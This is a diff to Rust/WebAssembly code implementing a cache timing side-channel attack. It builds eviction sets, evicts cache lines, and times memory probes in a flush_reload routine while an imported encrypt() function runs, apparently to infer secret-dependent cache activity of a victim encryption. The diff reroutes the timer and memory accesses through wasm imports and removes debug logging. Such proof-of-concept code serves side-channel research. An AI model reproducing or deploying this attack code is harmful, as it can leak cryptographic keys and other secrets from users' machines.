@@ -11,17 +11,21 @@ mod js {
         #[link(wasm_import_module = "js")]
         extern "C" {
             pub fn random() -> f64;
-            pub fn getTime() -> u64;
             pub fn encrypt();
             pub fn log(value: u64);
+        }
+    }
+    mod unsafe_wasm {
+        #[link(wasm_import_module = "wasm")]
+        extern "C" {
+            pub fn get_time() -> u64;
+            pub fn access(offset: u32);
+            pub fn timed_access(offset: u32) -> u64;
         }
     }
     
     pub fn random() -> f64 {
         unsafe { unsafe_js::random() }
-    }
-    pub fn get_time() -> u64 {
-        unsafe { unsafe_js::getTime() }
     }
     pub fn encrypt() {
         unsafe { unsafe_js::encrypt() }
@@ -29,34 +33,29 @@ mod js {
     pub fn log(value: u64) {
         unsafe { unsafe_js::log(value) };
     }
-}
-
-#[no_mangle]
-pub extern "C" fn get_time() -> u64 {
-    unsafe {
-        // core::ptr::read_unaligned(1 as *const i64) as u64
-        // let t : u64 = *(1 as *const u64);
-        // t
-        js::get_time()
+    pub fn get_time() -> u64 {
+        unsafe { unsafe_wasm::get_time() }
+    }
+    pub fn access(offset: u32) {
+        unsafe { unsafe_wasm::access(offset) }
+    }
+    pub fn timed_access(offset: u32) -> u64 {
+        unsafe { unsafe_wasm::timed_access(offset) }
     }
 }
 
 #[no_mangle]
-pub fn probe(target: &[u8], offset: usize) -> u64 {
-    let start = get_time();
-    {
-        let a = target[offset];
-    };
-    get_time() - start
+pub fn probe(target: &[u8], offset: u32) -> u64 {
+    let start = js::get_time();
+    js::access(offset);
+    js::get_time() - start
 }
 
 #[inline(always)]
 fn evict(target: &[u8], eviction_set: &LinkedList<u32>) {
     eviction_set
         .iter()
-        .for_each(|offset| {
-            let _ = target[*offset as usize];
-        });
+        .for_each(|offset| js::access(*offset));
 }
 
 #[inline(always)]
@@ -69,7 +68,7 @@ fn wait(number_of_cycles: u32) {
 
 fn get_slow_time(eviction_set: &LinkedList<u32>, target: &[u8], offset: u32) -> u64 {
     evict(target, eviction_set);
-    probe(target, offset as usize)
+    probe(target, offset)
 }
 
 fn generate_conflict_set(eviction_sets: &Vec<LinkedList<u32>>) -> LinkedList<u32> {
@@ -135,12 +134,12 @@ pub extern "C" fn flush_reload(threshold: u32, time_slots: u32, wait_cycles: u32
     log(wait_cycles as u64);
     log(time_slots as u64);
     log(time_slot_size as u64);
-    log(get_time() as u64);
-    log(get_time() as u64);
-    log(get_time() as u64);
-    log(get_time() as u64);
-    log(get_time() as u64);
-    log(get_time() as u64);
+    log(js::get_time() as u64);
+    log(js::get_time() as u64);
+    log(js::get_time() as u64);
+    log(js::get_time() as u64);
+    log(js::get_time() as u64);
+    log(js::get_time() as u64);
 
     let candidate_set : LinkedList<u32> = generate_candidate_set(target.as_ref());
     let eviction_sets : Vec<LinkedList<u32>> = probes //config.probes
@@ -151,26 +150,19 @@ pub extern "C" fn flush_reload(threshold: u32, time_slots: u32, wait_cycles: u32
     encrypt();
     let mut results : Vec<u32> = (0..time_slots)
         .flat_map(|_| {
-            let start = get_time();
+            let start = js::get_time();
             let time_slot_results : Vec<u32> = probes
                 .iter()
-                .map(|p| probe(target.as_ref(), *p as usize) as u32)
+                .map(|p| probe(target, *p) as u32)
                 .collect();
 
             evict(target.as_ref(), &conflict_set);
-            while get_time() - start < time_slot_size as u64 {
+            while js::get_time() - start < time_slot_size as u64 {
                 wait(wait_cycles);
             }
             time_slot_results
         })
         .collect();
-    results[0] = 1;
-    results[1] = 2;
-    results[2] = 3;
     let boxed : Box<[u32]> = results.into_boxed_slice();
-
-    log(boxed[0] as u64);
-    log(boxed[1] as u64);
-    log(boxed[2] as u64);
     boxed
 }
